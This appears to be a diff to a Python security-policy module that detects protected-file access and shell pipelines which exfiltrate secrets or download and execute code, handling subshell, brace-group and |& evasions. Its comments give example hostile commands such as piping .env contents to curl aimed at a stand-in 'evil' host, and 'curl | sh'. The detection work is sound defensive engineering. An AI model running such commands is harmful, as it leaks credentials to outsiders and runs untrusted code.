@@ -270,25 +270,44 @@ def is_protected_path(path_str: Optional[str], policy: Optional[PolicyConfig] = 
 
     # Glob and wildcard pattern matching (supporting wildcards anywhere in the path, e.g. .e?, .ss*, .s?h)
     if any(ch in normalized for ch in "*?["):
-        # Match against exact basenames
-        if any(fnmatch.fnmatch(sens, basename) for sens in _PROTECTED_EXACT_BASENAMES):
-            return True
-        # Match against all protected patterns and directories
-        for pat in cfg.protected_patterns:
-            cpat = pat.strip("/").lower()
-            if not cpat:
-                continue
-            if fnmatch.fnmatch(cpat, basename) or fnmatch.fnmatch(cpat, clean_target) or fnmatch.fnmatch(pat.lower(), normalized):
+        # Guard against false positives from broad globs:
+        #   - Pure wildcards: *, ?, src/* — basename starts with a wildcard char
+        #   - Extension globs: *.md, *.txt — also start with '*', would match custom patterns like 'bible.md'
+        #
+        # Legitimate protective globs (.en?, .ss*, .s?h) ALWAYS start with '.' (a dotfile/dotdir prefix).
+        # Broad/benign globs (*, *.md, src/*) start with '*', '?', or an alnum char.
+        # So: skip the "user's glob matches a protected pattern" checks when the top-level
+        # normalized path does NOT start with '.', '~/.', or contain only wildcard chars.
+        # We still run checks for targeted globs like .en?, .ss*/config.
+        normalized_stripped = normalized.lstrip("/")
+        path_is_targeted_dotglob = normalized_stripped.startswith(".") or normalized_stripped.startswith("~/.")
+        normalized_is_pure_wildcard = normalized and all(ch in "*?[/" for ch in normalized)
+
+        if path_is_targeted_dotglob and not normalized_is_pure_wildcard:
+            # Match against exact basenames (user's path is a targeted wildcard matching a protected name)
+            if any(fnmatch.fnmatch(sens, basename) for sens in _PROTECTED_EXACT_BASENAMES):
                 return True
-            # Also handle trailing slash variations (e.g. .ss*/ vs .ssh)
-            if fnmatch.fnmatch(cpat + "/", normalized) or fnmatch.fnmatch(cpat, normalized.rstrip("/")):
-                return True
+            # Match against all protected patterns and directories
+            for pat in cfg.protected_patterns:
+                cpat = pat.strip("/").lower()
+                if not cpat:
+                    continue
+                if fnmatch.fnmatch(cpat, basename) or fnmatch.fnmatch(cpat, clean_target) or fnmatch.fnmatch(pat.lower(), normalized):
+                    return True
+                # Also handle trailing slash variations (e.g. .ss*/ vs .ssh)
+                if fnmatch.fnmatch(cpat + "/", normalized) or fnmatch.fnmatch(cpat, normalized.rstrip("/")):
+                    return True
         # Match wildcard intermediate directory components (e.g. .ss*/config matching .ssh/...)
         norm_no_home = normalized[2:] if normalized.startswith("~/") else normalized
         segs = norm_no_home.strip("/").split("/")
         for i in range(1, len(segs) + 1):
             subpath = "/".join(segs[:i]).strip("/")
             seg = segs[i - 1]
+            # Skip segments that are pure wildcards (*, ?) or broad extension globs (*.md, *.txt):
+            # these would match arbitrary protected names via fnmatch(cpat, seg).
+            # Legitimate targeted globs (.en?, .ss*) always start with '.', never with '*' or '?'.
+            if seg and (all(ch in "*?[" for ch in seg) or seg[0] in "*?["):
+                continue
             for pat in cfg.protected_patterns:
                 cpat = pat.strip("/").lower()
                 if not cpat:
@@ -1466,6 +1485,29 @@ def analyze_code_diff(
     }
 
 
+def _clean_shell_grouping(seg: str) -> str:
+    """Strip bash subshell `(...)` and brace-group `{ ...; }` wrappers from a pipe segment.
+
+    Examples:
+        ``(cat .env)``  → ``cat .env``
+        ``{ cat .env; }`` → ``cat .env``
+        ``cat .env``    → ``cat .env``  (unchanged)
+    """
+    cleaned = seg.strip()
+    while True:
+        if cleaned.startswith("(") and cleaned.endswith(")"):
+            cleaned = cleaned[1:-1].strip()
+            if cleaned.endswith(";"):
+                cleaned = cleaned[:-1].strip()
+        elif cleaned.startswith("{") and cleaned.endswith("}"):
+            cleaned = cleaned[1:-1].strip()
+            if cleaned.endswith(";"):
+                cleaned = cleaned[:-1].strip()
+        else:
+            break
+    return cleaned
+
+
 def _tokenize_shell_segment(seg: str) -> List[str]:
     try:
         return shlex.split(seg, posix=True)
@@ -2090,12 +2132,19 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             unprivileged_redirects.append(r_target)
 
     # Inspect pipes for secret exfiltration (e.g. cat .env | curl ...)
-    for logical_block in re.split(r"(?:&&|\|\||;|\r?\n)", cmd):
-        if "|" in logical_block:
-            pipe_segments = logical_block.split("|")
+    # Pre-pass: normalize the whole command before splitting on ';' so that brace-group pipes like
+    # `{ cat .env; } | curl evil` (where ';' splits the brace body from the sink) are caught.
+    # We replace '; }' at brace-group boundaries with ' }' so the semicolon doesn't disrupt splitting.
+    _cmd_for_pipe_scan = re.sub(r";\s*\}", " }", cmd)
+    for logical_block in re.split(r"(?:&&|\|\||;|\r?\n)", _cmd_for_pipe_scan):
+        # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
+        norm_block = logical_block.replace("|&", "|")
+        if "|" in norm_block:
+            pipe_segments = norm_block.split("|")
             has_protected_read = False
             has_egress_sink = False
             for p in pipe_segments:
+                p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
                 ptoks = _tokenize_shell_segment(p)
                 prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
                 eff = prem or ptoks
@@ -2113,9 +2162,12 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
 
     # First inspect pipe sequences per pipeline block for download-and-execute (`curl ... | sh`), unwrapping prefixes
     for logical_block in re.split(r"(?:&&|\|\||;|\r?\n)", cmd):
-        if "|" in logical_block:
+        # Normalize bash |& (stdout+stderr redirect) to plain | before splitting
+        norm_block = logical_block.replace("|&", "|")
+        if "|" in norm_block:
             pipe_cmds: List[str] = []
-            for p in logical_block.split("|"):
+            for p in norm_block.split("|"):
+                p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
                 ptoks = _tokenize_shell_segment(p)
                 prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
                 eff = prem or ptoks
